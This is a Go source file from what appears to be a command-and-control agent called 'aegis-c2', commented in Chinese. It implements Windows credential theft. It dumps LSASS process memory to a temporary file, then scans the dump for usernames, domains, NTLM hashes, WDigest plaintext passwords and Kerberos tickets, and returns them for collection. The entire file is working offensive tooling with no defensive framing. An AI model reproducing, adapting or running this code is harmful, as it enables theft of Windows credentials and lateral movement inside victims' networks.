//go:build windows && amd64

package credentials

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/aegis-c2/aegis/agent/procdump"
	"github.com/aegis-c2/aegis/agent/winutil"
)

const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

var (
	procOpenProcess  = syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess")
	procCloseHandle  = syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle")
)

// ExtractFromLSASS 从 LSASS 进程内存中提取凭据。
//
// 策略：
//  1. 使用 MiniDumpWriteDump 转储 LSASS 内存到临时文件
//  2. 扫描转储文件中的 MSV1_0 凭据模式（用户名、NTLM 哈希）
//
// 注意：MSV1_0 内部结构随 Windows 版本变化，此实现使用启发式扫描
// 而非硬结构偏移量，以提高版本兼容性。
func ExtractFromLSASS() (*ExtractResult, error) {
	result := &ExtractResult{
		Credentials: make([]Credential, 0),
	}

	// Step 1: Find LSASS PID
	lsassPID, err := findLSASSPID()
	if err != nil {
		result.Error = err.Error()
		return result, err
	}

	// Step 2: Dump LSASS memory to temp file
	tmpDir := os.TempDir()
	dumpPath := filepath.Join(tmpDir, fmt.Sprintf("lsass_%d.dmp", lsassPID))

	if err := procdump.Dump(lsassPID, dumpPath, false); err != nil {
		result.Error = fmt.Sprintf("dump lsass: %v", err)
		return result, err
	}
	defer os.Remove(dumpPath)

	// Step 3: Read dump file and scan for credential patterns
	data, err := os.ReadFile(dumpPath)
	if err != nil {
		result.Error = fmt.Sprintf("read dump: %v", err)
		return result, err
	}

	creds := scanDumpForCredentials(data)
	result.Credentials = creds
	return result, nil
}

// scanDumpForCredentials 扫描内存转储文件中的凭据模式。
// 改进的启发式方法：搜索 MSV1_0 结构特征，增加 WDigest 明文密码和 Kerberos 检测。
func scanDumpForCredentials(data []byte) []Credential {
	var creds []Credential
	seen := make(map[string]bool)

	// Phase 1: Collect candidate strings (printable UTF-16LE, 2-60 chars)
	type candidate struct {
		offset int
		str    string
	}
	var userCandidates []candidate
	var domainCandidates []candidate
	var passwordCandidates []candidate

	for i := 0; i < len(data)-4; i++ {
		if data[i+1] != 0 || data[i] < 0x20 || data[i] > 0x7E {
			continue
		}

		s := extractWideString(data, i)
		if len(s) < 2 || len(s) > 60 {
			continue
		}

		// Domain-like: contains "NT AUTHORITY", "WORKGROUP", ends with ".LOCAL", etc.
		if isDomainLike(s) {
			domainCandidates = append(domainCandidates, candidate{i, s})
		}

		// Username-like: alphanumeric with limited special chars
		if isUsernameLike(s) {
			userCandidates = append(userCandidates, candidate{i, s})
		}

		// Password-like: 4-60 chars, contains mixed character types (no spaces)
		if isPasswordLike(s) {
			passwordCandidates = append(passwordCandidates, candidate{i, s})
		}
	}

	// Phase 2: For each username candidate, find nearby domain and hash
	for _, uc := range userCandidates {
		searchStart := max(0, uc.offset-512)
		searchEnd := min(len(data), uc.offset+512)
		window := data[searchStart:searchEnd]

		// Look for 16-byte NTLM hash in this window
		hash := findHashInWindow(window, searchStart)
		if hash == "" {
			continue
		}

		// Look for nearby domain
		domain := ""
		for _, dc := range domainCandidates {
			if dc.offset >= searchStart && dc.offset < searchEnd {
				if dc.offset >= uc.offset-256 && dc.offset <= uc.offset+256 {
					domain = dc.str
					break
				}
			}
		}

		// Check for nearby password (WDigest)
		password := ""
		for _, pc := range passwordCandidates {
			if pc.offset >= uc.offset-384 && pc.offset <= uc.offset+384 && pc.str != uc.str {
				// Reject passwords that look like usernames or domains
				if !isUsernameLike(pc.str) && !isDomainLike(pc.str) {
					password = pc.str
					break
				}
			}
		}

		// Build credential key to deduplicate
		key := strings.ToUpper(uc.str + ":" + hash)
		if !seen[key] {
			seen[key] = true
			cred := Credential{
				Username:   uc.str,
				Domain:     domain,
				Password:   password,
				SourceType: determineSourceType(password, domain),
				NTLMHash:   hash,
			}
			creds = append(creds, cred)
		}
	}

	// Phase 3: Scan for Kerberos ticket data (AP_REQ patterns)
	kerbCreds := scanKerberosTickets(data)
	for _, kc := range kerbCreds {
		key := strings.ToUpper(kc.Username + ":kerb:" + kc.TicketData)
		if !seen[key] {
			seen[key] = true
			creds = append(creds, kc)
		}
	}

	return creds
}

// determineSourceType 根据凭证特征判断来源类型。
func determineSourceType(password, domain string) string {
	hasPassword := password != ""
	hasDomain := domain != ""

	// 有明文密码 → WDigest
	if hasPassword {
		return "wdigest"
	}
	// 有域名但无密码 → Kerberos 缓存
	if hasDomain && strings.Contains(strings.ToUpper(domain), "CORP") {
		return "kerberos"
	}
	// 默认 MSV1_0
	return "msv"
}

// isPasswordLike 检查字符串是否像密码（WDigest 明文）。
func isPasswordLike(s string) bool {
	if len(s) < 4 || len(s) > 60 {
		return false
	}
	// 不能包含空格或控制字符
	for _, c := range s {
		if c <= 0x20 || c > 0x7E {
			return false
		}
	}
	// 必须至少包含一个小写字母和一个大写字母或数字
	hasLower := false
	hasUpperOrDigit := false
	for _, c := range s {
		if c >= 'a' && c <= 'z' {
			hasLower = true
		}
		if (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			hasUpperOrDigit = true
		}
	}
	return hasLower && hasUpperOrDigit
}

// scanKerberosTickets 扫描 LSASS 中的 Kerberos 票据数据。
// 检测 AP_REQ 结构 (0x6E) 和 KRB_CRED 结构 (0x76) 特征。
func scanKerberosTickets(data []byte) []Credential {
	var creds []Credential
	seen := make(map[string]bool)

	// KRB-CRED 魔数：0x76 + DER 长度标记
	for i := 0; i < len(data)-64; i++ {
		// ASN.1 SEQUENCE (0x30/0x76 for Kerberos context tag)
		if data[i] != 0x76 && data[i] != 0x6E {
			continue
		}

		// 检查后续字节是否为有效 DER 长度
		derLen := int(data[i+1])
		if derLen < 32 || derLen > 16384 {
			continue
		}

		// 在票据附近查找用户名
		searchStart := max(0, i-1024)
		searchEnd := min(len(data), i+derLen+64)
		window := data[searchStart:searchEnd]

		username := findUsernameNearKerb(window, searchStart)
		if username == "" {
			continue
		}

		// 提取票据数据（Base64 编码）
		ticketEnd := min(len(data), i+derLen)
		ticketData := data[i:ticketEnd]
		if len(ticketData) < 64 {
			continue
		}

		// 去重
		key := username + ":" + fmt.Sprintf("%d", i)
		if !seen[key] {
			seen[key] = true
			creds = append(creds, Credential{
				Username:   username,
				TicketData: base64.StdEncoding.EncodeToString(ticketData[:min(len(ticketData), 4096)]),
				SourceType: "kerberos",
			})
		}

		// 限制票据数量
		if len(creds) >= 50 {
			break
		}
	}

	return creds
}

// findUsernameNearKerb 在 Kerberos 票据附近查找用户名。
func findUsernameNearKerb(window []byte, baseOffset int) string {
	for i := 0; i < len(window)-4; i++ {
		if window[i+1] != 0 || window[i] < 0x20 || window[i] > 0x7E {
			continue
		}
		s := extractWideString(window, i)
		if len(s) >= 2 && len(s) <= 30 && isUsernameLike(s) {
			return s
		}
	}
	return ""
}

// isDomainLike 检查字符串是否像域名。
func isDomainLike(s string) bool {
	upper := strings.ToUpper(s)
	if strings.Contains(upper, "NT AUTHORITY") ||
		strings.Contains(upper, "WORKGROUP") ||
		strings.HasSuffix(upper, ".LOCAL") ||
		strings.HasSuffix(upper, ".COM") ||
		strings.Contains(upper, "CORP") ||
		strings.Contains(upper, "DOMAIN") {
		return true
	}
	// Check for domain-like format: FOO.BAR
	if strings.Count(s, ".") == 1 && len(s) > 4 {
		parts := strings.Split(s, ".")
		if len(parts[0]) >= 2 && len(parts[1]) >= 2 {
			return true
		}
	}
	return false
}

// isUsernameLike 检查字符串是否像用户名。
func isUsernameLike(s string) bool {
	// Reject common false positives
	if strings.Contains(s, "\\") || strings.Contains(s, ":") || strings.Contains(s, "/") {
		return false
	}
	if strings.HasPrefix(s, "%") || strings.HasPrefix(s, "$") {
		return false
	}
	// Must be mostly alphanumeric + underscore + $ + @
	alphaNum := 0
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
			c == '_' || c == '-' || c == '$' || c == '@' {
			alphaNum++
		}
	}
	if float64(alphaNum)/float64(len(s)) < 0.8 {
		return false
	}
	// Must start with letter or $ (system account)
	first := s[0]
	return (first >= 'a' && first <= 'z') || (first >= 'A' && first <= 'Z') || first == '$'
}

// findHashInWindow 在窗口中查找 16 字节 NTLM 哈希。
func findHashInWindow(data []byte, baseOffset int) string {
	for i := 0; i+16 < len(data); i++ {
		chunk := data[i : i+16]
		if isNTLMHash(chunk) {
			return hex.EncodeToString(chunk)
		}
	}
	return ""
}

// isNTLMHash 检查是否为有效的 NTLM 哈希模式。
// NTLM hashes 通常全非零且不全是相同字节。
func isNTLMHash(data []byte) bool {
	// All zeros = no hash
	allZero := true
	for _, b := range data {
		if b != 0 {
			allZero = false
			break
		}
	}
	if allZero {
		return false
	}

	// All same byte = unlikely to be real NTLM
	allSame := true
	for _, b := range data[1:] {
		if b != data[0] {
			allSame = false
			break
		}
	}
	if allSame {
		return false
	}

	// At least 14 of 16 bytes non-zero (stricter than before)
	nonZero := 0
	for _, b := range data {
		if b != 0 {
			nonZero++
		}
	}
	return nonZero >= 14
}

// extractWideString 从字节数组中提取 UTF-16LE 字符串。

// extractWideString 从字节数组中提取 UTF-16LE 字符串。
func extractWideString(data []byte, offset int) string {
	var runes []rune
	for i := offset; i+1 < len(data); i += 2 {
		if data[i] == 0 && data[i+1] == 0 {
			break
		}
		runes = append(runes, rune(uint16(data[i])|uint16(data[i+1])<<8))
	}
	return string(runes)
}

// findLSASSPID 查找 lsass.exe 的 PID。
func findLSASSPID() (int, error) {
	return winutil.FindLSASSPID()
}

// openProcess 打开目标进程。
func openProcess(pid int) (syscall.Handle, error) {
	ret, _, lastErr := procOpenProcess.Call(
		uintptr(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION),
		0,
		uintptr(pid),
	)
	if ret == 0 {
		return 0, fmt.Errorf("OpenProcess(%d): %v", pid, lastErr)
	}
	return syscall.Handle(ret), nil
}

// closeHandle 关闭句柄。
func closeHandle(handle syscall.Handle) {
	procCloseHandle.Call(uintptr(handle))
}
